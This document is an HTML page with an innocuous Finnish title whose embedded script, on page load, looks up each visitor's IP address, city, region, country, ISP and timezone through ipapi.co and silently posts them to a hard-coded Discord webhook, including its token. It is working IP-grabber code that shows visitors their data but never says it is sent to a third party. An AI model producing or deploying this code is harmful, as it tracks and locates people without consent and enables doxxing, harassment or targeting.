<!DOCTYPE html>
<html>
<head>
    <title>Onni Kiittä ja kuittaa</title>
</head>
<body>
    <h1>Onni Kiitta ja kuittaa</h1>
    <p>IP Address: <span id="ip-address">Loading...</span></p>
    <p>Location: <span id="ip-location">Loading...</span></p>
    <p>ISP: <span id="ip-isp">Loading...</span></p>
    <p>Timezone: <span id="ip-timezone">Loading...</span></p>
    <script>
        const webhookURL = "https://discordapp.com/api/webhooks/1339166600309243946/4E10W79rfGF2l_FrGOn-CgYbVnxOh9_vK33ykzwSBac-tHvdNAHECTt3ES5vHHfW4EVz"; // Replace with your actual webhook URL
        const ipInfoURL = "https://ipapi.co/json/"; // Change this to your preferred IP info service

        fetch(ipInfoURL)
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                const location = `${data.city}, ${data.region}, ${data.country_name}`;
                const isp = data.org;
                const timezone = data.timezone;

                document.getElementById('ip-address').textContent = ipAddress;
                document.getElementById('ip-location').textContent = location;
                document.getElementById('ip-isp').textContent = isp;
                document.getElementById('ip-timezone').textContent = timezone;


                sendIPInfoToWebhook({
                    ip: ipAddress,
                    location: location,
                    isp: isp,
                    timezone: timezone,
                }); // Send to discord

            })
            .catch(error => {
               document.getElementById('ip-address').textContent = 'Error loading IP information.';
               document.getElementById('ip-location').textContent = 'Error loading IP information.';
               document.getElementById('ip-isp').textContent = 'Error loading IP information.';
               document.getElementById('ip-timezone').textContent = 'Error loading IP information.';

            });

        function sendIPInfoToWebhook(info) {
          fetch(webhookURL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              content: `IP Information:\nIP Address: ${info.ip}\nLocation: ${info.location}\nISP: ${info.isp}\nTimezone: ${info.timezone}`,
            }),
          })
          .then(response => {
            if(!response.ok){
                console.error('Error sending IP info to discord')
            }
          })
          .catch(error => console.error('Error sending IP info to discord:', error));
        }
    </script>
</body>
</html>
